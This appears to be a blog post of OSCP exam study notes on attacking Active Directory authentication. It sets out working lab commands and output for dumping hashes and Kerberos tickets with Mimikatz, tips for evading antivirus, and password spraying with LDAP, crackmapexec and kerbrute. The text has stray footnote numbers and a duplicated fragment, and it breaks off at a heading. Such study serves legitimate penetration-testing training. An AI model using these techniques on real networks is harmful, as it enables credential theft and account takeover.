---
title: Attacking Active Directory Authentication
date: 2024-04-15 12:37:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Attacking Active Directory Authentication tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Attacking Active Directory Authentication

## Understanding Active Directory Authentication

### NTLM Authentication

NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.

There are seven steps in NTLM authentication.

![image](https://github.com/ryennewhite/ryennewhite.github.io/assets/112822039/1335acc0-fee5-40bf-aef4-ce96f87dd531)

### Kerberos Authentication

Kerberos has been used as Microsoft's primary authentication mechanism since Windows Server 2003. While NTLM authentication works via a challenge-and-response paradigm, Windows-based Kerberos authentication uses a ticket system.

A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application server itself. On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

![image](https://github.com/ryennewhite/ryennewhite.github.io/assets/112822039/0187d6a5-c558-4318-8c6b-0d5d0619340f)

### Cached AD Credentials

Since 

Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In modern versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS)1 memory space.

Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target. 

NOTE: In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an [injector like PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1), or use a built-in tool like [Task Manager to dump the entire LSASS process memory](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/), [move the dumped data to a helper machine, and then load the data into Mimikatz](http://www.fuzzysecurity.com/tutorials/18.html).

We'll use the jeff account we have the password for.

```console
kali$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.154.75

// start PS as Administrator

PS> cd C:\Tools

PS> .\mimikatz.exe

PS> privilege::debug

// dump creds of all logged on users

PS> sekurlsa::logonpasswords
* Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
* Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
```

Use these hashes with the Password Attacks section attacks.

A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets.

```console
// list contents of smb share on WEB04 - this creates and caches a service ticket!

PS> dir \\web04.corp.com\backup

// NOW use mimikatz again

PS> sekurlsa::tickets
Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.
If a server is installed as a Certification Authority (CA),14 it can issue and revoke digital certificates. We could issue certificates for web servers to use HTTPS or to authenticate users based on certificates from the CA via Smart Cards.15

These certificates may be marked as having a non-exportable private key16 for security reasons. If so, a private key associated with a certificate cannot be exported even with administrative privileges. However, there are various methods to export the certificate with the private key.

We can rely again on Mimikatz to accomplish this. The crypto17 module contains the capability to either patch the CryptoAPI18 function with crypto::capi19 or KeyIso20 service with crypto::cng,21 making non-exportable keys exportable.

## Performing Attacks on Active Directory Authentication

### Password Attacks

We should be aware of account lockouts when brute forcing.

```console
// check the account [policy

PS> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

The lockout threshold in this case is 5. Then we have to wait 30 minutes for the lockout observation window. With these settings, we could attempt 192 logins in a 24-hour period against every domain user without triggering a lockout.

Let's try three other password spraying attacks that have higher chances of success.

The first kind of password spraying attack uses LDAP and ADSI to perform a low and slow password attack against AD users. Previously, we performed queries against the domain controller as a logged-in user with DirectoryEntry.2 However, we can also make queries in the context of a different user by setting the DirectoryEntry instance. We used the DirectoryEntry constructor without arguments, but we can provide three arguments, including the LDAP path to the domain controller, the username, and the password.

```console
PS> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
PS> $PDC = ($domainObj.PdcRoleOwner).Name
PS> $SearchString = "LDAP://"
PS> $SearchString += $PDC + "/"
PS> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
PS> $SearchString += $DistinguishedName
PS> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

// if this password is correct, the object creation will be successful:
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com

// if the password is invalid, no object will be created and we will receive an exception
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

We could use this technique to create a PowerShell script that enumerates all users and performs authentications according to the Lockout threshold and Lockout observation window.

This password spraying tactic is already implemented in the PowerShell script C:\Tools\Spray-Passwords.ps1 on this client. The -Pass option allows us to set a single password to test, or we can submit a wordlist file using -File. We can also test admin accounts by adding the -Admin flag.

```console
PS> cd C:\Tools

PS> powershell -ep bypass

PS> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

The second kind of password spraying attack against AD users leverages SMB. comes with some drawbacks. This attack comes with drawbacks though, as for every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy and slow.

We can use crackmapexec on Kali to do this.

```console
kali$ cat users.txt
dave
jen
pete

kali$ crackmapexec smb 192.168.249.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.249.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.249.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
SMB         192.168.249.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
```

Note: crackmapexec doesn't examine the password policy of the domain before starting the password spraying. Be cautious about locking out user accounts with this method.

It does tell us who has admin privs on the target system, though, which we see when it appends (Pwn3d!) to the output.

```console
kali$ crackmapexec smb 192.168.249.75 -u dave -p 'Flowers1' -d corp.com
SMB         192.168.249.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
```

Lastly, let's try password spraying by obtaining a TGT. Using kinit5 on a Linux system, we can obtain and cache a Kerberos TGT. We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT. We could use Bash scripting or a programming language of our choice to automate this method. Fortunately, we can also use the tool kerbrute, which can be used on Windows and Linux.

```console
PS> type .\usernames.txt
pete
dave
jen

PS> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
2024/04/16 12:44:19 >  Using KDC(s):
2024/04/16 12:44:19 >   dc1.corp.com:88
2024/04/16 12:44:19 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2024/04/16 12:44:19 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2024/04/16 12:44:19 >  Done! Tested 3 logins (2 successes) in 0.104 seconds
```

Note: If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.

### AS-REP Roasting

